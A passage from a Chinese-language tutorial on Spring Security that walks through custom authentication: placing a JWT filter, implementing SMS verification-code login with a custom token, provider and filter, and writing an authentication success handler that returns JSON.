配置授权规则</span></span><br><span class="line">            .authorizeHttpRequests(auth -&gt; auth</span><br><span class="line">                .requestMatchers(<span class="string">&quot;/api/auth/**&quot;</span>).permitAll()</span><br><span class="line">                .anyRequest().authenticated()</span><br><span class="line">            )</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 3. 添加自定义的 JWT 过滤器</span></span><br><span class="line">            .addFilterBefore(<span class="keyword">new</span> <span class="title class_">JwtAuthenticationFilter</span>(), UsernamePasswordAuthenticationFilter.class);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> http.build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，即使 <code>UsernamePasswordAuthenticationFilter.class</code> 对应的过滤器因为 <code>formLogin().disable()</code> 而被移除了，这个类引用仍然可以作为一个有效的<strong>锚点</strong>，告诉 Spring Security 你的过滤器应该放在哪个逻辑位置上。</p>
<hr>
<h3 id="6-2-自定义认证逻辑"><a href="#6-2-自定义认证逻辑" class="headerlink" title="6.2 自定义认证逻辑"></a>6.2 自定义认证逻辑</h3><p>Spring Security 的认证架构是高度可插拔的。其核心在于 <code>AuthenticationManager</code> 将认证任务委托给一系列的 <code>AuthenticationProvider</code>。默认情况下，<code>DaoAuthenticationProvider</code> 负责处理用户名和密码。</p>
<p>当我们想实现全新的认证方式时，例如<strong>短信验证码登录</strong>、<strong>邮箱验证码登录</strong>、<strong>扫码登录</strong>或<strong>社交媒体一键登录</strong>（非标准 OAuth2），最佳实践就是<strong>创建我们自己的 <code>AuthenticationProvider</code></strong>。</p>
<h4 id="6-2-1-认证流程回顾与扩展点"><a href="#6-2-1-认证流程回顾与扩展点" class="headerlink" title="6.2.1 认证流程回顾与扩展点"></a>6.2.1 认证流程回顾与扩展点</h4><p>回想一下 <code>2.1</code> 节的认证流程：</p>
<ol>
<li><strong>Filter</strong> 拦截请求，从 <code>HttpServletRequest</code> 中提取凭证。</li>
<li>Filter 将凭证封装成一个**<code>Authentication</code> Token** (例如，<code>UsernamePasswordAuthenticationToken</code>)。</li>
<li>Token 被传递给 <strong><code>AuthenticationManager</code></strong> (<code>ProviderManager</code>)。</li>
<li><code>ProviderManager</code> 遍历其下的所有 <strong><code>AuthenticationProvider</code></strong>，询问谁能处理这种类型的 Token。</li>
<li>匹配的 <code>AuthenticationProvider</code> 执行核心认证逻辑，并返回一个<strong>已认证</strong>的 <code>Authentication</code> Token。</li>
</ol>
<p>要实现自定义认证，我们需要扩展以下三个关键组件：</p>
<ol>
<li><strong>自定义 <code>Authentication</code> Token</strong>: 用于封装新的凭证类型（如手机号和验证码）。</li>
<li><strong>自定义 <code>AuthenticationProvider</code></strong>: 用于实现新的认证逻辑（如校验验证码是否正确）。</li>
<li><strong>自定义 <code>Filter</code></strong>: 用于从请求中提取新的凭证，并发起认证流程。</li>
</ol>
<hr>
<h4 id="6-2-2-案例：实现短信验证码登录"><a href="#6-2-2-案例：实现短信验证码登录" class="headerlink" title="6.2.2 案例：实现短信验证码登录"></a>6.2.2 案例：实现短信验证码登录</h4><p>我们将以一个完整的“手机号 + 短信验证码”登录为例，一步步实现自定义认证。</p>
<p><strong>步骤 1: 创建自定义 <code>Authentication</code> Token</strong></p>
<p>我们需要一个类来携带手机号和验证码。这个类必须继承 <code>AbstractAuthenticationToken</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.security.authentication.AbstractAuthenticationToken;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.GrantedAuthority;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SmsCodeAuthenticationToken</span> <span class="keyword">extends</span> <span class="title class_">AbstractAuthenticationToken</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object principal; <span class="comment">// 通常是手机号</span></span><br><span class="line">    <span class="keyword">private</span> Object credentials; <span class="comment">// 通常是验证码</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数1: 用于封装认证前的凭证</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SmsCodeAuthenticationToken</span><span class="params">(Object principal, Object credentials)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="literal">null</span>); <span class="comment">// 认证前权限为 null</span></span><br><span class="line">        <span class="built_in">this</span>.principal = principal;</span><br><span class="line">        <span class="built_in">this</span>.credentials = credentials;</span><br><span class="line">        setAuthenticated(<span class="literal">false</span>); <span class="comment">// 明确标记为未认证</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数2: 用于封装认证后的信息</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SmsCodeAuthenticationToken</span><span class="params">(Object principal, Object credentials,</span></span><br><span class="line"><span class="params">                                        Collection&lt;? extends GrantedAuthority&gt; authorities)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(authorities); <span class="comment">// 认证后传入权限</span></span><br><span class="line">        <span class="built_in">this</span>.principal = principal;</span><br><span class="line">        <span class="built_in">this</span>.credentials = credentials;</span><br><span class="line">        <span class="built_in">super</span>.setAuthenticated(<span class="literal">true</span>); <span class="comment">// 明确标记为已认证</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getCredentials</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.credentials;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getPrincipal</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.principal;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAuthenticated</span><span class="params">(<span class="type">boolean</span> isAuthenticated)</span> <span class="keyword">throws</span> IllegalArgumentException &#123;</span><br><span class="line">        <span class="keyword">if</span> (isAuthenticated) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(</span><br><span class="line">                    <span class="string">&quot;Cannot set this token to trusted - use constructor which takes a GrantedAuthority list instead&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">super</span>.setAuthenticated(<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eraseCredentials</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.eraseCredentials();</span><br><span class="line">        credentials = <span class="literal">null</span>; <span class="comment">// 认证成功后清除凭证</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>步骤 2: 创建自定义 <code>AuthenticationProvider</code></strong></p>
<p>这是核心认证逻辑的实现。它需要实现 <code>AuthenticationProvider</code> 接口。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.security.authentication.AuthenticationProvider;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.authentication.BadCredentialsException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.Authentication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.AuthenticationException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UserDetails;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UserDetailsService;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设我们有一个 SmsCodeService 用于校验验证码</span></span><br><span class="line"><span class="comment">// @Component</span></span><br><span class="line"><span class="comment">// public class SmsCodeService &#123;</span></span><br><span class="line"><span class="comment">//     public boolean verifyCode(String mobile, String code) &#123; ... &#125;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SmsCodeAuthenticationProvider</span> <span class="keyword">implements</span> <span class="title class_">AuthenticationProvider</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserDetailsService userDetailsService;</span><br><span class="line">    <span class="keyword">private</span> SmsCodeService smsCodeService; <span class="comment">// 注入我们自己的验证码服务</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过构造函数注入依赖</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SmsCodeAuthenticationProvider</span><span class="params">(UserDetailsService userDetailsService, SmsCodeService smsCodeService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userDetailsService = userDetailsService;</span><br><span class="line">        <span class="built_in">this</span>.smsCodeService = smsCodeService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Authentication <span class="title function_">authenticate</span><span class="params">(Authentication authentication)</span> <span class="keyword">throws</span> AuthenticationException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">mobile</span> <span class="operator">=</span> (String) authentication.getPrincipal();</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> (String) authentication.getCredentials();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 核心校验逻辑：调用服务验证验证码是否正确</span></span><br><span class="line">        <span class="keyword">if</span> (!smsCodeService.verifyCode(mobile, code)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BadCredentialsException</span>(<span class="string">&quot;SMS code is invalid.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 验证码正确，加载用户信息</span></span><br><span class="line">        <span class="comment">// 注意：这里的 UserDetailsService 是通过手机号加载用户的。</span></span><br><span class="line">        <span class="comment">// 你可能需要自定义 UserDetailsService 的实现。</span></span><br><span class="line">        <span class="type">UserDetails</span> <span class="variable">userDetails</span> <span class="operator">=</span> userDetailsService.loadUserByUsername(mobile);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 认证成功，创建一个已认证的 Token</span></span><br><span class="line">        <span class="type">SmsCodeAuthenticationToken</span> <span class="variable">authenticatedToken</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SmsCodeAuthenticationToken</span>(</span><br><span class="line">                userDetails, <span class="comment">// principal 现在是 UserDetails 对象</span></span><br><span class="line">                <span class="literal">null</span>,        <span class="comment">// credentials 设为 null</span></span><br><span class="line">                userDetails.getAuthorities() <span class="comment">// 权限</span></span><br><span class="line">        );</span><br><span class="line">        authenticatedToken.setDetails(authentication.getDetails());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> authenticatedToken;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">supports</span><span class="params">(Class&lt;?&gt; authentication)</span> &#123;</span><br><span class="line">        <span class="comment">// 告诉 AuthenticationManager，我能处理 SmsCodeAuthenticationToken 类型的 Token</span></span><br><span class="line">        <span class="keyword">return</span> (SmsCodeAuthenticationToken.class.isAssignableFrom(authentication));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong><code>supports()</code> 方法至关重要</strong>，它就像 <code>Provider</code> 在向 <code>Manager</code> “举手”说：“这种类型的认证请求，我能处理！”</p>
<p><strong>步骤 3: 创建自定义 <code>Filter</code></strong></p>
<p>我们需要一个过滤器来拦截短信登录请求（例如 <code>POST /sms/login</code>），提取手机号和验证码，然后启动认证流程。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.security.authentication.AuthenticationManager;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.Authentication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.AuthenticationException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.web.util.matcher.AntPathRequestMatcher;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SmsCodeAuthenticationFilter</span> <span class="keyword">extends</span> <span class="title class_">AbstractAuthenticationProcessingFilter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEFAULT_LOGIN_REQUEST_URL</span> <span class="operator">=</span> <span class="string">&quot;/sms/login&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">HTTP_METHOD</span> <span class="operator">=</span> <span class="string">&quot;POST&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SPRING_SECURITY_FORM_MOBILE_KEY</span> <span class="operator">=</span> <span class="string">&quot;mobile&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SPRING_SECURITY_FORM_CODE_KEY</span> <span class="operator">=</span> <span class="string">&quot;code&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SmsCodeAuthenticationFilter</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="keyword">new</span> <span class="title class_">AntPathRequestMatcher</span>(DEFAULT_LOGIN_REQUEST_URL, HTTP_METHOD));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SmsCodeAuthenticationFilter</span><span class="params">(AuthenticationManager authenticationManager)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="keyword">new</span> <span class="title class_">AntPathRequestMatcher</span>(DEFAULT_LOGIN_REQUEST_URL, HTTP_METHOD), authenticationManager);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Authentication <span class="title function_">attemptAuthentication</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> AuthenticationException &#123;</span><br><span class="line">        <span class="comment">// 从请求中提取手机号和验证码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">mobile</span> <span class="operator">=</span> request.getParameter(SPRING_SECURITY_FORM_MOBILE_KEY);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> request.getParameter(SPRING_SECURITY_FORM_CODE_KEY);</span><br><span class="line">        </span><br><span class="line">        mobile = (mobile != <span class="literal">null</span>) ? mobile.trim() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        code = (code != <span class="literal">null</span>) ? code : <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建未认证的 Token</span></span><br><span class="line">        <span class="type">SmsCodeAuthenticationToken</span> <span class="variable">authRequest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SmsCodeAuthenticationToken</span>(mobile, code);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将请求详情（如 IP 地址）设置到 Token 中</span></span><br><span class="line">        authRequest.setDetails(<span class="built_in">this</span>.authenticationDetailsSource.buildDetails(request));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用 AuthenticationManager，发起认证</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getAuthenticationManager().authenticate(authRequest);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>步骤 4: 将它们组装到 <code>SecurityFilterChain</code></strong></p>
<p>最后一步是将我们创建的这三个组件整合到安全配置中。这通常需要创建一个自定义的 <code>SecurityConfigurer</code>，或者直接在 <code>SecurityFilterChain</code> 中配置。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityConfig</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ... (注入 UserDetailsService, SmsCodeService 等)</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http, AuthenticationManager authenticationManager)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. 创建并配置我们的 Filter</span></span><br><span class="line">        <span class="type">SmsCodeAuthenticationFilter</span> <span class="variable">smsCodeFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SmsCodeAuthenticationFilter</span>(authenticationManager);</span><br><span class="line">        <span class="comment">// (可选) 设置成功和失败的处理器</span></span><br><span class="line">        smsCodeFilter.setAuthenticationSuccessHandler(<span class="keyword">new</span> <span class="title class_">MyAuthenticationSuccessHandler</span>());</span><br><span class="line">        smsCodeFilter.setAuthenticationFailureHandler(<span class="keyword">new</span> <span class="title class_">MyAuthenticationFailureHandler</span>());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2. 创建我们的 Provider</span></span><br><span class="line">        <span class="type">SmsCodeAuthenticationProvider</span> <span class="variable">smsCodeProvider</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SmsCodeAuthenticationProvider</span>(userDetailsService, smsCodeService);</span><br><span class="line"></span><br><span class="line">        http</span><br><span class="line">            .authorizeHttpRequests(auth -&gt; auth.anyRequest().authenticated())</span><br><span class="line">            .formLogin(Customizer.withDefaults())</span><br><span class="line">            <span class="comment">// 3. 将我们的 Provider 添加到 AuthenticationManager 的管理中</span></span><br><span class="line">            .authenticationProvider(smsCodeProvider)</span><br><span class="line">            <span class="comment">// 4. 将我们的 Filter 添加到过滤器链的合适位置</span></span><br><span class="line">            .addFilterAfter(smsCodeFilter, UsernamePasswordAuthenticationFilter.class);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> http.build();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> AuthenticationManager <span class="title function_">authenticationManager</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> http.getSharedObject(AuthenticationManagerBuilder.class).build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>配置解读</strong>:</p>
<ol>
<li>我们创建了 <code>SmsCodeAuthenticationFilter</code> 的实例。</li>
<li>我们创建了 <code>SmsCodeAuthenticationProvider</code> 的实例。</li>
<li>通过 <code>http.authenticationProvider(smsCodeProvider)</code>，我们将自定义的 Provider 注册到了 <code>ProviderManager</code> 中。现在 <code>ProviderManager</code> 在遍历时就能找到它了。</li>
<li>通过 <code>http.addFilterAfter(smsCodeFilter, ...)</code>，我们将自定义的 Filter 插入到了过滤器链中。放在 <code>UsernamePasswordAuthenticationFilter</code> 之后意味着，如果请求不是 <code>/sms/login</code>，它会继续被后面的过滤器处理（如表单登录过滤器）。</li>
</ol>
<p>现在，当用户向 <code>POST /sms/login</code> 发送包含 <code>mobile</code> 和 <code>code</code> 参数的请求时，你的自定义认证流程就会被完整地触发！</p>
<hr>
<p><strong>其他场景的思路</strong>:</p>
<ul>
<li><strong>扫码登录</strong>:<ol>
<li><strong>Filter</strong>: 拦截一个轮询接口（如 <code>/check-scan-status?ticket=xxx</code>）。</li>
<li><strong>Token</strong>: 包含一个一次性的 <code>ticket</code>。</li>
<li><strong>Provider</strong>: 认证逻辑是检查这个 <code>ticket</code> 对应的扫码状态（在 Redis 或数据库中）是否已被 App 端确认为“已扫码并同意登录”。如果确认，则加载用户信息，认证成功。</li>
</ol>
</li>
<li><strong>内部系统免密认证</strong>:<ol>
<li><strong>Filter</strong>: 从请求头或参数中提取一个预共享密钥或内部服务 Token。</li>
<li><strong>Token</strong>: 包含这个密钥。</li>
<li><strong>Provider</strong>: 认证逻辑是验证这个密钥是否有效，如果有效，则直接认证通过，并为其赋予一个预设的系统角色。</li>
</ol>
</li>
</ul>
<hr>
<h3 id="6-3-自定义认证成功-失败处理器"><a href="#6-3-自定义认证成功-失败处理器" class="headerlink" title="6.3 自定义认证成功&#x2F;失败处理器"></a>6.3 自定义认证成功&#x2F;失败处理器</h3><p>在 Spring Security 的认证流程中，当 <code>AbstractAuthenticationProcessingFilter</code>（如 <code>UsernamePasswordAuthenticationFilter</code>）收到 <code>AuthenticationManager</code> 的认证结果后，它不会自己决定接下来该做什么，而是将后续处理委托给两个专门的策略接口：</p>
<ul>
<li><strong><code>AuthenticationSuccessHandler</code></strong>: 当认证<strong>成功</strong>时被调用。</li>
<li><strong><code>AuthenticationFailureHandler</code></strong>: 当认证<strong>失败</strong>时被调用。</li>
</ul>
<p>通过实现这两个接口，我们可以完全掌控认证成功或失败后的行为，例如返回自定义的 JSON、记录日志、更新用户统计数据等。</p>
<h4 id="6-3-1-AuthenticationSuccessHandler-处理认证成功"><a href="#6-3-1-AuthenticationSuccessHandler-处理认证成功" class="headerlink" title="6.3.1 AuthenticationSuccessHandler: 处理认证成功"></a>6.3.1 <code>AuthenticationSuccessHandler</code>: 处理认证成功</h4><h5 id="1-默认行为"><a href="#1-默认行为" class="headerlink" title="1. 默认行为"></a>1. 默认行为</h5><p>默认的 <code>SavedRequestAwareAuthenticationSuccessHandler</code> 非常智能，它会：</p>
<ol>
<li>检查 Session 中是否存在一个“被保存的请求”（<code>SavedRequest</code>）。这通常是用户在登录前尝试访问的那个受保护页面。</li>
<li>如果存在，它会将用户<strong>重定向到那个原始请求的 URL</strong>。</li>
<li>如果不存在（例如，用户是直接访问的登录页面），它会将用户重定向到一个配置好的<strong>默认成功 URL</strong>（通常是根路径 <code>/</code>）。</li>
</ol>
<p>这种行为非常适合传统的、基于页面的 Web 应用。</p>
<hr>
<h5 id="2-为什么需要自定义？"><a href="#2-为什么需要自定义？" class="headerlink" title="2. 为什么需要自定义？"></a>2. 为什么需要自定义？</h5><p>在前后端分离的架构中（例如 Vue&#x2F;React + Spring Boot API），前端发起登录请求后，期望的不是页面重定向，而是一个包含成功信息和 <strong>JWT (JSON Web Token)</strong> 的 <strong>JSON 响应</strong>。前端拿到这个 Token 后会将其存储起来，并在后续的 API 请求中携带。</p>
<hr>
<h5 id="3-实现登录成功后返回-JSON-Token"><a href="#3-实现登录成功后返回-JSON-Token" class="headerlink" title="3. 实现登录成功后返回 JSON Token"></a>3. 实现登录成功后返回 JSON Token</h5><p><strong>步骤 1: 创建 <code>AuthenticationSuccessHandler</code> 的实现类</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.Authentication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.web.authentication.AuthenticationSuccessHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAuthenticationSuccessHandler</span> <span class="keyword">implements</span> <span class="title class_">AuthenticationSuccessHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span 